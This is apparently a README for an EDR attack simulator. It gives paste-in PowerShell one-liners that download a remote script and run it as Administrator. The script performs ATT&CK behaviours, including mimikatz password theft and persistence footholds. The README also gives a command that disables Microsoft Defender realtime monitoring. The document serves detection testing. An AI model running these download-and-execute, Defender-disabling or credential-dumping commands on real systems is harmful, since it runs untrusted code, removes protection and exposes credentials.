## Datto EDR Behavioral Attack Simulator
**Platform:** Microsoft Windows 7+ or Server 2008+\
**Powershell Version:** 3.0+\
**.NET Version:** 4.5+

*This script will execute several MITRE ATT&CK adversarial behaviors and add several footholds/Autoruns which are pointed at non-malware (calculator and cmd.exe).  The only malicous software run is mimikatz (steals passwords from memory) which will not persist. The following command is all you need.  Run it on any windows system from within Powershell (Administrator-level) and it will download this script and execute it.*

---
## Run Attack Script

#### From Powershell:
```
[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1")
```

### OR

#### From outside Powershell (like in cmd.exe or a batch script):
```
powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript.ps1") }
```

*WARNING: This script will leave your system in a messy state with some persist footholds set to launch calculators at varying times in the future. Run the cleanup script to remove these.*

 
---
---
---
## Disable Defender (Endpoint Protection)

*While the script will attempt to disable Microsoft Defender's realtime protection in the evasion step, you may need to proactively disable your endpoint protection prior to running this initial command to let the initial script run:*

#### Disable Microsoft Defender's realtime Monitoring:
```
powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $true'
```

#### Restore Microsoft Defender's realtime monitoring:
```
powershell.exe -command 'Set-MpPreference -DisableRealtimeMonitoring $false'
```

---

## Cleanup Script:
*Some persist footholds are left on systems in order to test non-realtime foothold scanning. Run this to remove them*

#### From Powershell:
```
[System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript_fullrestore.ps1")
```

### OR

#### From outside Powershell (like in cmd.exe or a batch script):
```
powershell.exe -ExecutionPolicy bypass -noprofile -nologo -command { [System.Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072); Invoke-Expression (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Infocyte/PowershellTools/master/AttackSim/attackscript_fullrestore.ps1") }
```
